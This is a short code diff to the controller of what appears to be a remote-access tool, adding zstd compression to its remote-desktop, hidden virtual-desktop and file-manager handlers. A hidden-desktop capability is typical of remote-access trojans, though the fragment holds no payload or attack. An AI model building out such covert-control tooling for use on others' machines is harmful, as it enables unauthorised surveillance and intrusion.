@@ -2614,11 +2614,13 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         break;
     }
     case TOKEN_DRIVE_LIST_PLUGIN: { // 文件管理【x】
+        ContextObject->EnableZstdContext(6);
         g_2015RemoteDlg->SendMessage(WM_OPENFILEMGRDIALOG, 0, (LPARAM)ContextObject);
         break;
     }
     case TOKEN_BITMAPINFO_HIDE: { // 虚拟桌面【x】
         ContextObject->SetNoDelay(TRUE);
+        ContextObject->EnableZstdContext(-1);
         g_2015RemoteDlg->SendMessage(WM_OPENHIDESCREENDLG, 0, (LPARAM)ContextObject);
         break;
     }
@@ -2644,10 +2646,12 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     }
     case TOKEN_BITMAPINFO: { // 远程桌面【x】
         ContextObject->SetNoDelay(TRUE);
+        ContextObject->EnableZstdContext(-1);
         g_2015RemoteDlg->SendMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)ContextObject);
         break;
     }
     case TOKEN_DRIVE_LIST: { // 文件管理【x】
+        ContextObject->EnableZstdContext(6);
         g_2015RemoteDlg->SendMessage(WM_OPENFILEMANAGERDIALOG, 0, (LPARAM)ContextObject);
         break;
     }
